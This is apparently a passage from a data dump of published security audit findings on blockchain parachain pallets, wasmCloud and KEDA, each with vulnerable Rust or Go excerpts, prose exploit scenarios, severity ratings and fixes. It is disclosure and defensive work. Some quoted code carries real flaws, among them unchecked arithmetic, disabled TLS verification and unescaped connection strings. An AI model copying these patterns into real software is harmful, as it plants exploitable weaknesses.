<redacted> } Figure 6.3: cycles_account_manager/src/lib.rs:671 Thus, if a sandboxed process reports a lower memory usage, the cycles account manager will charge the canister less than it should. It is unclear whether this represents expected behavior when a canister breaks out of the Wasm execution environment. Clearly, if the canister is able to execute arbitrary code in the context of a sandboxed process, then the replica has lost all ability to meter and restrict canister execution, which means that accounting for canister cycle and memory use is largely meaningless. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. The canister reports the wrong memory sizes back to the replica with the execution output. This causes the cycles account manager to miscalculate the remaining available cycles for the canister in the charge_canister_for_resource_allocation_and_usage method. Recommendations Short term, document this behavior and ensure that implicitly trusting the canister output could not adversely aect the replica or other canisters running on the system. Consider enforcing the correct invariants for memory allocations reported by a sandboxed process. The following invariant should always hold for Wasm and stable memory: page_map_size <= memory.size <= MAX_SIZE page_map_size could be computed as memory.page_map.num_host_pages() * PAGE_SIZE.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Vulnerable dependencies in the Substrate parachain ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The Parallel Finance parachain node uses the following dependencies with known vulnerabilities. (All of the dependencies listed are inherited from the Substrate framework.) Dependency Version ID", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "2. Users can avoid accruing interest by repaying a zero amount ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "To repay borrowed funds, users call the repay_borrow extrinsic. The extrinsic implementation calls the Pallet::repay_borrow_internal method to recompute the loan balance. Pallet::repay_borrow_internal updates the loan balance for the account and resets the borrow index as part of the calculation. fn repay_borrow_internal ( borrower: & T ::AccountId, asset_id: AssetIdOf <T>, account_borrows: BalanceOf <T>, repay_amount: BalanceOf <T>, ) -> DispatchResult { // ... <redacted> AccountBorrows::<T>::insert( asset_id, borrower, BorrowSnapshot { principal: account_borrows_new , borrow_index: Self ::borrow_index(asset_id) , }, ); TotalBorrows::<T>::insert(asset_id, total_borrows_new); Ok (()) } Figure 2.1: pallets/loans/src/lib.rs:1057-1087 The borrow index is used in the calculation of the accumulated interest for the loan in Pallet::current_balance_from_snapshot . Specically, the outstanding balance, snapshot.principal , is multiplied by the quotient of borrow_index divided by snapshot.borrow_index . pub fn current_balance_from_snapshot ( asset_id: AssetIdOf <T>, snapshot: BorrowSnapshot <BalanceOf<T>>, ) -> Result <BalanceOf<T>, DispatchError> { if snapshot.principal.is_zero() || snapshot.borrow_index.is_zero() { return Ok (Zero::zero()); } // Calculate new borrow balance using the interest index: // recent_borrow_balance = snapshot.principal * borrow_index / // snapshot.borrow_index let recent_borrow_balance = Self ::borrow_index(asset_id) .checked_div(&snapshot.borrow_index) .and_then(|r| r.checked_mul_int(snapshot.principal)) .ok_or(ArithmeticError::Overflow)?; Ok (recent_borrow_balance) } Figure 2.2: pallets/loans/src/lib.rs:1106-1121 Therefore, if the snapshot borrow index is updated to Self::borrow_index(asset_id) , the resulting recent_borrow_balance in Pallet::current_balance_from_snapshot will always be equal to snapshot.principal . That is, no interest will be applied to the loan. It follows that the accrued interest is lost whenever part of the loan is repaid. In an extreme case, if the repaid amount passed to repay_borrow is 0 , users could reset the borrow index without repaying anything. The same issue is present in the implementations of the liquidated_transfer and borrow extrinsics as well. Exploit Scenario A malicious user borrows assets from Parallel Finance and calls repay_borrow with a repay_amount of zero. This allows her to avoid paying interest on the loan. Recommendations Short term, modify the code so that the accrued interest is added to the snapshot principal when the snapshot is updated. Long term, add unit tests for edge cases (like repaying a zero amount) to increase the chances of discovering unexpected system behavior.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "3. Missing validation in Pallet::force_update_market ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The Pallet::force_update_market method can be used to replace the stored market instance for a given asset. Other methods used to update market parameters perform extensive validation of the market parameters, but force_update_market checks only the rate model. pub fn force_update_market ( origin: OriginFor <T>, asset_id: AssetIdOf <T>, market: Market <BalanceOf<T>>, ) -> DispatchResultWithPostInfo { T::UpdateOrigin::ensure_origin(origin)?; ensure!( market.rate_model.check_model(), Error::<T>::InvalidRateModelParam ); let updated_market = Self ::mutate_market(asset_id, |stored_market| { *stored_market = market; stored_market.clone() })?; Self ::deposit_event(Event::<T>::UpdatedMarket(updated_market)); Ok (().into()) } Figure 3.1: pallets/loans/src/lib.rs:539-556 This means that the caller (who is either the root account or half of the general council) could inadvertently change immutable market parameters like ptoken_id by mistake. Exploit Scenario The root account calls force_update_market to update a set of market parameters. By mistake, the ptoken_id market parameter is updated, which means that Pallet::ptoken_id and Pallet::underlying_id are no longer inverses. Recommendations Short term, consider adding more input validation to the force_update_market extrinsic. In particular, it may make sense to ensure that the ptoken_id market parameter has not changed. Alternatively, add validation to check whether the ptoken_id market parameter is updated and to update the UnderlyingAssetId map to ensure that the value matches the Markets storage map.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Missing validation in multiple StakingLedger methods ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The staking ledger is used to keep track of the total amount of staked funds in the system. It is updated in response to cross-consensus messaging (XCM) requests to the parent chain (either Polkadot or Kusama). A number of the StakingLedger methods lack sucient input validation before they update the staking ledgers internal state. Even though the input is validated as part of the original XCM call, there could still be issues due to implementation errors or overlooked corner cases. First, the StakingLedger::rebond method does not use checked arithmetic to update the active balance. The method should also check that the computed unlocking_balance is equal to the input value at the end of the loop to ensure that the system remains consistent. pub fn rebond (& mut self , value: Balance ) { let mut unlocking_balance: Balance = Zero::zero(); while let Some (last) = self .unlocking.last_mut() { if unlocking_balance + last.value <= value { unlocking_balance += last.value; self .active += last.value; self .unlocking.pop(); } else { let diff = value - unlocking_balance; unlocking_balance += diff; self .active += diff; last.value -= diff; } if unlocking_balance >= value { break ; } } } Figure 4.1: pallets/liquid-staking/src/types.rs:199-219 Second, the StakingLedger::bond_extra method does not use checked arithmetic to update the total and active balances . pub fn bond_extra (& mut self , value: Balance ) { self .total += value; self .active += value; } Figure 4.2: pallets/liquid-staking/src/types.rs:223-226 Finally, the StakingLedger::unbond method does not use checked arithmetic when updating the active balance. pub fn unbond (& mut self , value: Balance , target_era: EraIndex ) { if let Some ( mut chunk) = self .unlocking .last_mut() .filter(|chunk| chunk.era == target_era) { // To keep the chunk count down, we only keep one chunk per era. Since // `unlocking` is a FIFO queue, if a chunk exists for `era` we know that // it will be the last one. chunk.value = chunk.value.saturating_add(value); } else { self .unlocking.push(UnlockChunk { value, era: target_era , }); }; // Skipped the minimum balance check because the platform will // bond `MinNominatorBond` to make sure: // 1. No chill call is needed // 2. No minimum balance check self .active -= value; } Figure 4.3: pallets/liquid-staking/src/types.rs:230-253 Since the staking ledger is updated by a number of the XCM response handlers, and XCM responses may return out of order, it is important to ensure that input to the staking ledger methods is validated to prevent issues due to race conditions and corner cases. We could not nd a way to exploit this issue, but we cannot rule out the risk that it could be used to cause a denial-of-service condition in the system. Exploit Scenario The staking ledger's state is updated as part of a WithdrawUnbonded request, leaving the unlocking vector in the staking ledger empty. Later, when the response to a previous call to rebond is handled, the ledger is updated again, which leaves it in an inconsistent state. Recommendations Short term, ensure that the balance represented by the staking ledgers unlocking vector is enough to cover the input balance passed to StakingLedger::rebond . Use checked arithmetic in all staking ledger methods that update the ledgers internal state to ensure that issues due to data races are detected and handled correctly.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "5. Failed XCM requests left in storage ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "When the liquid-staking pallet generates an XCM request for the parent chain, the corresponding XCM response triggers a call to Pallet::notification_received . If the response is of the Response::ExecutionResult type, this method calls Pallet::do_notification_received to handle the result. The Pallet::do_notification_received method checks whether the request was successful and then updates the local state according to the corresponding XCM request, which is obtained from the XcmRequests storage map. fn do_notification_received ( query_id: QueryId , request: XcmRequest <T>, res: Option <( u32 , XcmError)>, ) -> DispatchResult { use ArithmeticKind::*; use XcmRequest::*; let executed = res.is_none(); if !executed { return Ok (()); } match request { Bond { index: derivative_index , amount, } => { ensure!( !StakingLedgers::<T>::contains_key(&derivative_index), Error::<T>::AlreadyBonded ); let staking_ledger = <StakingLedger<T::AccountId, BalanceOf<T>>>::new( Self ::derivative_sovereign_account_id(derivative_index), amount, ); StakingLedgers::<T>::insert(derivative_index, staking_ledger); MatchingPool::<T>::try_mutate(|p| -> DispatchResult { p.update_total_stake_amount(amount, Subtraction) })?; T::Assets::burn_from( Self ::staking_currency()?, & Self ::account_id(), Amount )?; } // ... <redacted> } XcmRequests::<T>::remove(&query_id); Ok (()) } Figure 5.1: pallets/liquid-staking/src/lib.rs:1071-1159 If the method completes without errors, the XCM request is removed from storage via a call to XcmRequests<T>::remove(query_id) . However, if any of the following conditions are true, the corresponding XCM request is left in storage indenitely: 1. The request fails and Pallet::do_notification_received exits early. 2. Pallet::do_notification_received fails. 3. The response type is not Response::ExecutionResult . These three cases are currently unhandled by the codebase. The same issue is present in the crowdloans pallet implementation of Pallet::do_notification_received . Recommendations Short term, ensure that failed XCM requests are handled correctly by the crowdloans and liquid-staking pallets.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. Risk of using stale oracle prices in loans pallet ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The loans pallet uses oracle prices to nd a USD value of assets using the get_price function (gure 6.1). The get_price function internally uses the T::PriceFeeder::get_price function, which returns a timestamp and the price. However, the returned timestamp is ignored. pub fn get_price (asset_id: AssetIdOf <T>) -> Result <Price, DispatchError> { let (price, _) = T::PriceFeeder::get_price(&asset_id) .ok_or(Error::<T>::PriceOracleNotReady)?; if price.is_zero() { return Err (Error::<T>::PriceIsZero.into()); } log::trace!( target: \"loans::get_price\" , \"price: {:?}\" , price.into_inner() ); Ok (price) } Figure 6.1: pallets/loans/src/lib.rs: 1430-1441 Exploit Scenario The price feeding oracles fail to deliver prices for an extended period of time. The get_price function returns stale prices, causing the get_asset_value function to return a non-market asset value. Recommendations Short term, modify the code so that it compares the returned timestamp from the T::PriceFeeder::get_price function with the current timestamp, returns an error if the price is too old, and handles the emergency price, which currently has a timestamp of zero. This will stop the market if stale prices are returned and allow the governance process to intervene with an emergency price.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Missing calculations in crowdloans extrinsics ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The claim extrinsic in the crowdloans pallet is missing code to subtract the claimed amount from vault.contributed to update the total contribution amount (gure 7.1). A similar bug exists in the refund extrinsic: there is no subtraction from vault.contributed after the Self::contribution_kill call. pub fn claim ( origin: OriginFor <T>, crowdloan: ParaId , lease_start: LeasePeriod , lease_end: LeasePeriod , ) -> DispatchResult { // ... <redacted> Self ::contribution_kill( vault.trie_index, &who, ChildStorageKind::Contributed ); Self ::deposit_event(Event::<T>::VaultClaimed( crowdloan, (lease_start, lease_end), ctoken, who, amount, VaultPhase::Succeeded, )); Ok (()) } Figure 7.1: pallets/crowdloans/src/lib.rs: 718- Exploit Scenario The claim extrinsic is called, but the total amount in vault.contributed is not updated, leading to incorrect calculations in other places. Recommendations Short term, update the claim and refund extrinsics so that they subtract the amount from vault.contributed . Long term, add a test suite to ensure that the vault state stays consistent after the claim and refund extrinsics are called.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "8. Event emitted when update_vault and set_vrf calls do not make updates ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The update_vault extrinsic in the crowdloans pallet is responsible for updating the three values shown in gure 8.1. It is possible to call update_vault in such a way that no update is performed, but the function emits an event regardless of whether an update occurred. The same situation occurs in the set_vrfs extrinsic (gure 8.2). pub fn update_vault ( origin: OriginFor <T>, crowdloan: ParaId , cap: Option <BalanceOf<T>>, end_block: Option <BlockNumberFor<T>>, contribution_strategy: Option <ContributionStrategy>, ) -> DispatchResult { T::UpdateVaultOrigin::ensure_origin(origin)?; let mut vault = Self ::current_vault(crowdloan) .ok_or(Error::<T>::VaultDoesNotExist)?; if let Some (cap) = cap { // ... <redacted> } if let Some (end_block) = end_block { // ... <redacted> } if let Some (contribution_strategy) = contribution_strategy { // ... <redacted> } // ... <redacted> Self ::deposit_event(Event::<T>::VaultUpdated( crowdloan, (lease_start, lease_end), contribution_strategy, cap, end_block, )); Ok (()) } Figure 8.1: pallets/crowdloans/src/lib.rs:424-472 pub fn set_vrfs (origin: OriginFor <T>, vrfs: Vec <ParaId>) -> DispatchResult { T::VrfOrigin::ensure_origin(origin)?; log::trace!( target: \"crowdloans::set_vrfs\" , \"pre-toggle. vrfs: {:?}\" , vrfs ); Vrfs::<T>::try_mutate(|b| -> Result <(), DispatchError> { *b = vrfs.try_into().map_err(|_| Error::<T>::MaxVrfsExceeded)?; Ok (()) })?; Self ::deposit_event(Event::<T>::VrfsUpdated( Self ::vrfs())); Ok (()) } Figure 8.2: pallets/crowdloans/src/lib.rs:599-616 Exploit Scenario A system observes that the VaultUpdate event was emitted even though the vault state did not actually change. Based on this observation, it performs logic that should be executed only when the state has been updated. Recommendations Short term, modify the VaultUpdate event so that it is emitted only when the update_vault extrinsic makes an actual update. Optionally, have the update_vault extrinsic return an error to the caller when calling it results in no updates.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. The referral code is a sequence of arbitrary bytes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The referral code is used in a number of extrinsic calls in the crowdloans pallet. Because the referral code is never validated, it can be a sequence of arbitrary bytes. The referral code is logged by a number of extrinsics. However, it is currently impossible to perform log injection because the referral code is printed as a hexidecimal string rather than raw bytes (using the debug representation). pub fn contribute ( origin: OriginFor <T>, crowdloan: ParaId , #[pallet::compact] amount: BalanceOf <T>, referral_code: Vec < u8 > , ) -> DispatchResultWithPostInfo { // ... <redacted> log::trace!( target: \"crowdloans::contribute\" , \"who: {:?}, para_id: {:?}, amount: {:?}, referral_code: {:?}\" , &who, &crowdloan, &amount, &referral_code ); Ok (().into()) } Figure 9.1: pallets/crowdloans/src/lib.rs: 502-594 Exploit Scenario The referral code is rendered as raw bytes in a vulnerable environment, introducing an opportunity to perform a log injection attack. Recommendations Short term, choose and implement a data type that models the referral code semantics as closely as possible.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. Missing validation of referral code size ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "The length of the referral code is not validated by the contribute extrinsic dened by the crowdloans pallet. Since the referral code is stored by the node, a malicious user could call contribute multiple times with a very large referral code. This would increase the memory pressure on the node, potentially leading to memory exhaustion. fn do_contribute ( who: & AccountIdOf <T>, crowdloan: ParaId , vault_id: VaultId , amount: BalanceOf <T>, referral_code: Vec < u8 >, ) -> Result <(), DispatchError> { // ... <redacted> XcmRequests::<T>::insert( query_id, XcmRequest::Contribute { crowdloan, vault_id, who: who .clone(), amount, referral_code: referral_code .clone() , }, ); // ... <redacted> Ok (()) } Figure 10.1: pallets/crowdloans/src/lib.rs: 1429- Exploit Scenario A malicious user calls the contribute extrinsic multiple times with a very large referral code. This increases the memory pressure on the validator nodes and eventually causes all parachain nodes to run out of memory and crash. Recommendations Short term, add validation that limits the size of the referral code argument to the contribute extrinsic.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "11. Code duplication in crowdloans pallet ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf", "body": "A number of extrinsics in the crowdloans pallet have duplicate code. The close , reopen , and auction_succeeded extrinsics have virtually identical logic. The migrate_pending and refund extrinsics are also fairly similar. Exploit Scenario A vulnerability is found in the duplicate code, but it is patched in only one place. Recommendations Short term, refactor the close , reopen , and auction_succeeded extrinsics into one function, to be called with values specic to the extrinsics. Refactor common pieces of logic in the migrate_pending and refund extrinsics. Long term, avoid code duplication, as it makes the system harder to review and update. Perform regular code reviews and track any logic that is duplicated.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Out-of-bounds crash in extract_claims ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-wasmCloud-securityreview.pdf", "body": "The strip_custom_section function does not suciently validate data and crashes when the range is not within the buer (gure 1.1). The function is used in the extract_claims function and is given an untrusted input. In the wasmCloud-otp , even though extract_claims is called as an Erlang NIF (Native Implemented Function) and potentially could bring down the VM upon crashing, the panic is handled gracefully by the Rustler library, resulting in an isolated crash of the Elixir process. if let Some ((id, range )) = payload.as_section() { wasm_encoder::RawSection { id, data: & buf [range] , } .append_to(& mut output); } Figure 1.1: wascap/src/wasm.rs#L161-L167 We found this issue by fuzzing the extract_claims function with cargo-fuzz (gure 2.1). #![no_main] use libfuzzer_sys::fuzz_target; use getrandom::register_custom_getrandom; // TODO: the program wont compile without this, why? fn custom_getrandom (buf: & mut [ u8 ]) -> Result <(), getrandom::Error> { return Ok (()); } register_custom_getrandom!(custom_getrandom); fuzz_target!(|data: & [ u8 ]| { let _ = wascap::wasm::extract_claims(data); }); Figure 1.2: A simple extract_claims fuzzing harness that passes the fuzzer-provided bytes straight to the function After xing the issue (gure 1.3), we fuzzed the function for an extended period of time; however, we found no additional issues. if let Some ((id, range)) = payload.as_section() { if range.end <= buf.len() { wasm_encoder::RawSection { id, data: & buf [range], } .append_to(& mut output); } else { return Err (errors::new(ErrorKind::InvalidCapability)); } } Figure 1.3: The x we applied to continue fuzzing extract_claims . The code requires a new error value because we reused one of the existing ones that likely does not match the semantics. Exploit Scenario An attacker deploys a new module with invalid claims. While decoding the claims, the extract_claims function panics and crashes the Elixir process. Recommendations Short term, x the strip_custom_section function by adding the range check, as shown in the gure 1.3. Add the extract_claims fuzzing harness to the wascap repository and run it for an extended period of time before each release of the library. Long term, add a fuzzing harness for each Rust function that processes user-provided data. References  Erlang - NIFs", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "2. Stack overow while enumerating containers in blobstore-fs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-wasmCloud-securityreview.pdf", "body": "The all_dirs function is vulnerable to a stack overow caused by unbounded recursion, triggered by either the presence of circular symlinks inside the root of the blobstore (as congured during startup), or the presence of excessively nested directory inside the same. Because this function is used by FsProvider::list_containers , this issue would result in a denial of service for all actors that use the method exposed by aected blobstores. let mut subdirs: Vec <PathBuf> = Vec ::new(); for dir in &dirs { let mut local_subdirs = all_dirs(prefix.join(dir.as_path()).as_path(), prefix); subdirs.append( &mut local_subdirs); } dirs.append( &mut subdirs); dirs Figure 2.1: capability-providers/blobstore-fs/src/fs_utils.rs#L24-L30 Exploit Scenario An attacker creates a circular symlink inside the storage directory. Alternatively, an attacker canunder the right circumstancescreate successively nested directories with a sucient depth to cause a stack overow. blobstore.create_container(ctx, &\"a\".to_string()). await ?; blobstore.create_container(ctx, &\"a/a\".to_string()). await ?; blobstore.create_container(ctx, &\"a/a/a\".to_string()). await ?; ... blobstore.create_container(ctx, &\"a/a/a/.../a/a/a\".to_string()). await ?; blobstore.list_containers(). await ?; Figure 2.2: Possible attack to a vulnerable blobstore In practice, this attack requires the underlying le system to allow exceptionally long lenames, and we have not been able to produce a working attack payload. However, this does not prove that no such le systems exist or will exist in the future. Recommendations Short term, limit the amount of allowable recursion depth to ensure that no stack overow attack is possible given realistic stack sizes, as shown in gure 2.3. pub fn all_dirs(root: &Path, prefix: &Path, depth: i32 ) -> Vec <PathBuf> { if depth > 1000 { return vec![]; } ... // Now recursively go in all directories and collect all sub-directories let mut subdirs: Vec <PathBuf> = Vec ::new(); for dir in &dirs { let mut local_subdirs = all_dirs( prefix.join(dir.as_path()).as_path(), prefix, depth + 1 ); subdirs.append( &mut local_subdirs); } dirs.append( &mut subdirs); dirs } Figure 2.3: Limiting the amount of allowable recursion depth Long term, consider limiting the reliance on the underlying le system to a minimum by disallowing nesting containers. For example, Base64-encode all container and object names before passing them down to the le system routines. References  OWASP Denial of Service Cheat Sheet (\"Input validation\" section)", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Denial of service in blobstore-s3 using malicious actor ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-wasmCloud-securityreview.pdf", "body": "The stream_bytes function continues looping until it detects that all of the available bytes have been sent. It does this based on the output of the send_chunk function, which reports the amount of bytes that have been sent by the call. An attacker could send specially crafted responses that cause stream_bytes to continue looping, causing send_chunk to report that no errors were detected while also reporting that no bytes were sent. while bytes_sent < bytes_to_send { let chunk_offset = offset + bytes_sent; let chunk_len = (self.max_chunk_size() as u64).min(bytes_to_send - bytes_sent); bytes_sent += self .send_chunk ( ctx, Chunk { is_last: offset + chunk_len > end_range, bytes: bytes[bytes_sent as usize..(bytes_sent + chunk_len) as usize] .to_vec(), offset: chunk_offset as u64, container_id: bucket_id.to_string(), object_id: cobj.object_id.clone(), }, ) .await?; } Figure 3.1: capability-providers/blobstore-s3/src/lib.rs#L188-L204 Exploit Scenario An attacker can send a maliciously crafted request to get an object from a blobstore-s3 provider, then send successful responses without making actual progress in the transfer by reporting that empty-sized chunks were received. Recommendations Make send_chunk report a failure if a zero-sized response is received.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "4. Unexpected panic in validate_token ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-wasmCloud-securityreview.pdf", "body": "The validate_token function from the wascap library panics with an out-of-bounds error when input is given in an unexpected format. The function expects the input to be a valid JWT token with three segments separated by a dot (gure 4.1). This implicit assumption is satised in the code; however, the function is public and does not mention the assumption in its documentation. /// Validates a signed JWT. This will check the signature, expiration time, and not-valid-before time pub fn validate_token <T>(input: &str ) -> Result <TokenValidation> where T: Serialize + DeserializeOwned + WascapEntity, { } let segments: Vec <& str > = input.split( '.' ).collect(); let header_and_claims = format! ( \"{}.{}\" , segments[ 0 ] , segments[ 1 ] ); let sig = base64::decode_config( segments[ 2 ] , base64::URL_SAFE_NO_PAD)?; ... Figure 4.1: wascap/src/jwt.rs#L612-L641 Exploit Scenario A developer uses the validate_token function expecting it to fully validate the token string. The function receives an untrusted malicious input that forces the program to panic. Recommendations Short term, add input format validation before accessing the segments and a test case with malformed input. Long term, always validate all inputs to functions or document the input assumptions if validation is not in place for a specic reason.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Incorrect error message when starting actor from le ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-wasmCloud-securityreview.pdf", "body": "The error message when starting an actor from a le contains a string interpolation bug that causes the message to not include the fileref content (gure 5.1). This causes the error message to contain the literal string ${fileref} instead. It is worth noting that the leref content will be included anyway as an attribute. Logger .error( \"Failed to read actor file from ${fileref} : #{ inspect(err) } \" , fileref : fileref ) Figure 5.1: host_core/lib/host_core/actors/actor_supervisor.ex#L301 Recommendations Short term, change the error message to correctly interpolate the fileref string. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Use of fmt.Sprintf to build host:port string ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "Several scalers use a construct like fmt.Sprintf(\"%s:%s\", host, port) to create a host:port address string from a user-supplied host and port. This approach is problematic when the host is a literal IPv6 address, which should be enclosed in square brackets when the address is part of a resource identier. An address created using simple string concatenation, such as with fmt.Sprintf , may fail to parse when given to Go standard library functions. The following source les incorrectly use fmt.Sprintf to create an address:  pkg/scalers/cassandra_scaler.go:115  pkg/scalers/mongo_scaler.go:191  pkg/scalers/mssql_scaler.go:220  pkg/scalers/mysql_scaler.go:149  pkg/scalers/predictkube_scaler.go:128  pkg/scalers/redis_scaler.go:296  pkg/scalers/redis_scaler.go:364 Recommendations Short term, use net.JoinHostPort instead of fmt.Sprintf to construct network addresses. The documentation for the net package states the following: JoinHostPort combines host and port into a network address of the form host:port . If host contains a colon, as found in literal IPv6 addresses, then JoinHostPort returns [host]:port . Long term, use Semgrep and the sprintf-host-port rule of semgrep-go to detect future instances of this issue. 2. MongoDB scaler does not encode username and password in connection string Severity: Low Diculty: Low Type: Data Validation Finding ID: TOB-KEDA-2 Target: pkg/scalers/mongo_scaler.go", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "3. Prometheus metrics server does not support TLS ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "The KEDA Metrics Adapter exposes Prometheus metrics on an HTTP server listening on port 9022. Though Prometheus supports scraping metrics over TLS-enabled connections, KEDA does not oer TLS for this server. The function responsible for starting the HTTP server, prommetrics.NewServer , does so using the http.ListenAndServe function, which does not enable TLS. func (metricsServer PrometheusMetricServer) NewServer(address string , pattern string ) { http.HandleFunc( \"/healthz\" , func (w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) _, err := w.Write([] byte ( \"OK\" )) if err != nil { log.Fatalf( \"Unable to write to serve custom metrics: %v\" , err) } }) log.Printf( \"Starting metrics server at %v\" , address) http.Handle(pattern, promhttp.HandlerFor(registry, promhttp.HandlerOpts{})) // initialize the total error metric _, errscaler := scalerErrorsTotal.GetMetricWith(prometheus.Labels{}) if errscaler != nil { log.Fatalf( \"Unable to initialize total error metrics as : %v\" , errscaler) } log.Fatal( http.ListenAndServe(address, nil ) ) } Figure 3.1: prommetrics.NewServer exposes Prometheus metrics without TLS ( pkg/prommetrics/adapter_prommetrics.go#L82-L99 ). Exploit Scenario A user sets up KEDA with Prometheus integration, enabling the scraping of metrics on port 9022. When Prometheus makes a connection to the server, it is unencrypted, leaving both the request and response vulnerable to interception and tampering in transit. As KEDA does not support TLS for the server, the user has no way to ensure the condentiality and integrity of these metrics. Recommendations Short term, provide a ag to enable TLS for Prometheus metrics exposed by the Metrics Adapter. The usual way to enable TLS for an HTTP server is using the http.ListenAndServeTLS function.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. Return value is dereferenced before error check ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "After certain calls to http.NewRequestWithContext , the *Request return value is dereferenced before the error return value is checked (see the highlighted lines in gures 4.1 and 4.2). checkTokenRequest, err := http.NewRequestWithContext(ctx, \"HEAD\" , tokenURL.String(), nil ) checkTokenRequest.Header.Set( \"X-Subject-Token\" , token) checkTokenRequest.Header.Set( \"X-Auth-Token\" , token) if err != nil { return false , err } Figure 4.1: pkg/scalers/openstack/keystone_authentication.go#L118-L124 req, err := http.NewRequestWithContext(ctx, \"GET\" , url, nil ) req.SetBasicAuth(s.metadata.username, s.metadata.password) req.Header.Set( \"Origin\" , s.metadata.corsHeader) if err != nil { return - 1 , err } Figure 4.2: pkg/scalers/artemis_scaler.go#L241-L248 If an error occurred in the call to NewRequestWithContext , this behavior could result in a panic due to a nil pointer dereference. Exploit Scenario One of the calls to http.NewRequestWithContext shown in gures 4.1 and 4.2 returns an error and a nil *Request pointer. The subsequent code dereferences the nil pointer, resulting in a panic, crash, and DoS condition for the aected KEDA scaler. Recommendations Short term, check the error return value before accessing the returned *Request (e.g., by calling methods on it). Long term, use CodeQL and its go/missing-error-check query to detect future instances of this issue.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Undetermined"]}, {"title": "5. Unescaped components in PostgreSQL connection string ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "The PostgreSQL scaler creates a connection string by formatting the congured host, port, username, database name, SSL mode, and password with fmt.Sprintf : meta.connection = fmt.Sprintf( \"host=%s port=%s user=%s dbname=%s sslmode=%s password=%s\" , host, port, userName, dbName, sslmode, password, ) Figure 5.1: pkg/scalers/postgresql_scaler.go#L127-L135 However, none of the parameters included in the format string are escaped before the call to fmt.Sprintf . According to the PostgreSQL documentation ,  To write an empty value, or a value containing spaces, surround it with single quotes, for example keyword = 'a value' . Single quotes and backslashes within a value must be escaped with a backslash, i.e., \\' and \\\\ . As KEDA does not perform this escaping, the connection string could fail to parse if any of the conguration parameters (e.g., the password) contains symbols with special meaning in PostgreSQL connection strings. Furthermore, this issue may allow the injection of harmful or unintended parameters into the connection string using spaces and equal signs. Although the latter attack violates assumptions about the applications behavior, it is not a severe issue in KEDAs case because users can already pass full connection strings via the connectionFromEnv conguration parameter. Exploit Scenario A user congures the PostgreSQL scaler with a password containing a space. As the PostgreSQL scaler does not escape the password in the connection string, when the client connection is initialized, the string fails to parse, an error is thrown, and the scaler does not function. Recommendations Short term, escape the user-provided PostgreSQL parameters using the method described in the PostgreSQL documentation . Long term, use the custom Semgrep rule provided in Appendix C to detect future instances of this issue.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "6. Redis scalers set InsecureSkipVerify when TLS is enabled ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "The Redis Lists scaler (of which most of the code is reused by the Redis Streams scaler) supports the enableTLS option to allow the connection to the Redis server to use Transport Layer Security (TLS). However, when creating the TLSConfig for the Redis client, the scaler assigns the InsecureSkipVerify eld to the value of enableTLS (Figure 6.1), which means that certicate and server name verication is always disabled when TLS is enabled. This allows trivial MitM attacks, rendering TLS ineective. if info.enableTLS { options.TLSConfig = &tls.Config{ InsecureSkipVerify: info.enableTLS, } } Figure 6.1: KEDA sets InsecureSkipVerify to the value 